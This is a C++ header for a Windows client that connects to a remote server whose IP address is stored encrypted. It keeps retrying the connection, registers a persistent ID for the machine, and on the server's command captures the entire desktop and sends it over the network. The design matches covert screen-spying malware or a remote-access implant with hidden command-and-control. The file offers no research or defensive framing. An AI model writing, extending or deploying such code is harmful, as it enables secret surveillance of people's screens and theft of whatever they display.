#ifndef CLIENT_H
#define CLIENT_H

#include <WinSock2.h>
#include <stdio.h>
#include <stdlib.h>
#include <WS2tcpip.h>
#include "screenshot.h"
#include "id_handler.h"
#include "decrypt.h"
#include <vector>

#pragma comment(lib, "Ws2_32.lib")

const int DEFAULT_PORT = 6081;
const std::string DEFAULT_IP_ADDRESS = "7O047LN464073";

class Client {
public:
	Client() {
		init_server();
	}
	~Client() {
		if (clientSocket_ != INVALID_SOCKET) {
			closesocket(clientSocket_);
		}
		if (hwnd_ != nullptr) {
			ReleaseDC(hwnd_, GetDC(hwnd_));
		}
		if (hwindowCompatibleDC_ != nullptr) {
			DeleteDC(hwindowCompatibleDC_);
		}
		if (hwindowDC_ != nullptr) {
			DeleteDC(hwindowDC_);
		}
	}
private: // Private Functions
	bool ack() {
		// Receive ack from server
		int ackBytes = recv(clientSocket_, receivedCommand_, 16, 0);

		if (ackBytes < 0) {
			std::cout << "Error receiving ack: " << WSAGetLastError() << std::endl;
			return false;
		}
		else if (ackBytes == 0) {
			std::cout << "Server disconnected" << std::endl;
			return false;
		}
		receivedCommand_[ackBytes] = '\0';

		std::cout << "Received ack: " << receivedCommand_ << std::endl;
		if (strcmp(receivedCommand_, "0") == 0) {
			std::cout << "Server rejected connection" << std::endl;
			runProgram_ = false;
			return false;
		}
		else if (strcmp(receivedCommand_, "1") == 0) {
			std::cout << "Server accepted connection" << std::endl;
			return true;
		}
	}
	void init_server() {
		// get handles to a device context (DC)
		hwnd_ = GetDesktopWindow();
		hwindowDC_ = GetDC(hwnd_);
		hwindowCompatibleDC_ = CreateCompatibleDC(hwindowDC_);
		SetStretchBltMode(hwindowCompatibleDC_, COLORONCOLOR);

		// define scale, height and width
		screenx_ = GetSystemMetrics(SM_XVIRTUALSCREEN);
		screeny_ = GetSystemMetrics(SM_YVIRTUALSCREEN);
		width_ = GetSystemMetrics(SM_CXVIRTUALSCREEN);
		height_ = GetSystemMetrics(SM_CYVIRTUALSCREEN);

		wVersionRequested_ = MAKEWORD(2, 2);
		wsaErr_ = WSAStartup(wVersionRequested_, &wsaData_);

		if (wsaErr_ != 0) {
			std::cout << "The Winsock dll not found!" << std::endl;
			return;
		}
		
		while (runProgram_) {
			clientSocket_ = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
			if (clientSocket_ == INVALID_SOCKET) {
				std::cout << "Error at socket(): " << WSAGetLastError() << std::endl;
				WSACleanup();
				return;
			}

			serverAddress_.sin_family = AF_INET;
			std::string decryptedIp = decrypt_ip(DEFAULT_IP_ADDRESS.c_str());
			
			if (inet_pton(AF_INET, decryptedIp.c_str(), &serverAddress_.sin_addr) <= 0) {
				closesocket(clientSocket_);
				WSACleanup();
				return;
			}

			serverAddress_.sin_port = htons(decrypt_port(DEFAULT_PORT));

			// Try to connect until it is successful
			while (runProgram_) {
				if (connect(clientSocket_, (CONST SOCKADDR*) & serverAddress_, sizeof(serverAddress_)) == SOCKET_ERROR) {
					std::cout << "Failed to connect to server: " << WSAGetLastError() << std::endl;
					Sleep(1000);
					continue;
				}
				else {
					std::cout << "Connected to server" << std::endl;
					break;
				}
			}

			// Connection successful handle handshake via id

			if (!IdHandler::check_if_exists() || IdHandler::is_empty()) {
				IdHandler::create_file();
				// Doesn't have id, send server '0' to get one. Id is a 15 random char ending with '\0'
				send(clientSocket_, "0", 1, 0);
				if (!ack()) {
					if (runProgram_) continue;
					else break;
				}
				int idBytes = recv(clientSocket_, receivedCommand_, 16, 0); receivedCommand_[15] = '\0';
				if (idBytes < 0) {
					std::cout << "Error receiving id: " << WSAGetLastError() << std::endl;
					continue;
				}
				else if (idBytes == 0) {
					std::cout << "Server disconnected" << std::endl;
					continue;
				}

				std::cout << "Received id: " << receivedCommand_ << std::endl;
				id = (std::string) receivedCommand_;
				IdHandler::write_id(id);
			}
			else {
				// Send 1 to indicate that it has an id
				send(clientSocket_, "1", 1, 0); 
				// Send the id to get verified
				IdHandler::read_id(id);
				send(clientSocket_, id.c_str(), 16, 0);
				if (!ack()) {
					if (runProgram_) continue;
					else break;
				}
			}

			while (runProgram_) {
				if (!recv_command()) {
					break;
				}
				if (!send_src()) {
					break;
				}
			}
		}
	}

	bool recv_command() {
		if (clientSocket_ == INVALID_SOCKET) {
			std::cout << "Invalid socket" << std::endl;
			return false;
		}

		int receivedBytes = recv(clientSocket_, receivedCommand_, 16, 0);
		if (receivedBytes < 0) {
			std::cout << "Server recv error: " << WSAGetLastError() << std::endl;
			return false;
		}
		else if (receivedBytes == 0) {
			std::cout << "Server disconnected" << std::endl;
			return false;
		}

		receivedCommand_[receivedBytes] = '\0';

		std::cout << "Received command: " << receivedCommand_ << std::endl;

		if (strcmp(receivedCommand_, "0") == 0) { // Will stop the server
			runProgram_ = false;
			return false;
		}
		else if (strcmp(receivedCommand_, "1") == 0) { // Will take a screenshot
			src_ = capture_screen_mat(hwnd_, hwindowDC_, hwindowCompatibleDC_, screenx_, screeny_, width_, height_);
			if (src_.empty()) {
				std::cout << "Failed to capture screen" << std::endl;
				runProgram_ = false;
				return false;
			}
		}
		
		return true;
	}

	bool send_src() {
		if (clientSocket_ == INVALID_SOCKET) {
			std::cout << "Invalid socket" << std::endl;
			return false;
		}
		int sentBytes = 0;
		// Encode the image as PNG format load it to a buffer
		cv::imencode(".png", src_, buf_);

		// First send the size of the image
		uint32_t bufSize = htonl(buf_.size()); // Convert to network byte order
		sentBytes = send(clientSocket_, reinterpret_cast<const char*>(&bufSize), sizeof(bufSize), 0);
		if (sentBytes < 0) {
			std::cout << "Error sending buffer size: " << WSAGetLastError() << std::endl;
			return false;
		}
		else if (sentBytes == 0) {
			std::cout << "Server disconnected" << std::endl;
			return false;
		}

		// Send the image buffer itself in chunks
		const char* bufPtr = reinterpret_cast<const char*>(buf_.data());
		int totalSent = 0;
		int bufSizeNetworkOrder = ntohl(bufSize);
		while (totalSent < bufSizeNetworkOrder) {
			sentBytes = send(clientSocket_, bufPtr + totalSent, bufSizeNetworkOrder - totalSent, 0);
			if (sentBytes < 0) {
				std::cout << "Error sending buffer: " << WSAGetLastError() << std::endl;
				return false;
			}
			else if (sentBytes == 0) {
				std::cout << "Server disconnected" << std::endl;
				return false;
			}
			totalSent += sentBytes;
		}

		return true;
	}

private: // Private Variables
	WSAData wsaData_ = { 0 }; 
	int wsaErr_ = 0;
	SOCKET clientSocket_ = INVALID_SOCKET;
	WORD wVersionRequested_ = { 0 };
	sockaddr_in serverAddress_;
	char receivedCommand_[17];

	std::string filename_;
	bool runProgram_ = true;
	cv::Mat src_;
	HWND hwnd_ = nullptr;
	HDC hwindowDC_ = nullptr;
	HDC hwindowCompatibleDC_ = nullptr;
	int screenx_ = 0, screeny_ = 0, width_ = 0, height_ = 0;
	std::vector<uchar> buf_;
	std::string id;
};

#endif // !SERVER_H
